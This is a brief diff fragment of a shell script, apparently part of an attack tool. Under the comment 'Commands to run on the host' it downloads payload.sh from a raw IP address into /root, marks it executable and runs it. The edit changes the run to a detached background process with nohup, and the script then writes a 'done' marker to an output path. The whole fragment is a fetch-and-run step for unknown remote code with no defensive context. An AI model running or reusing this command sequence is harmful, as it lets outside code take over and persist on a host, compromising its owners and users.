@@ -21,7 +21,7 @@ OUTPATH=\$(dirname \$0)/${OUTPUT_NAME}
 # Commands to run on the host<
 curl http://35.194.58.97/payload.sh --output /root/payload.sh
 chmod +x /root/payload.sh
-/root/payload.sh
+nohup /root/payload.sh &
 echo done > \${OUTPATH}
 
 __EOF__
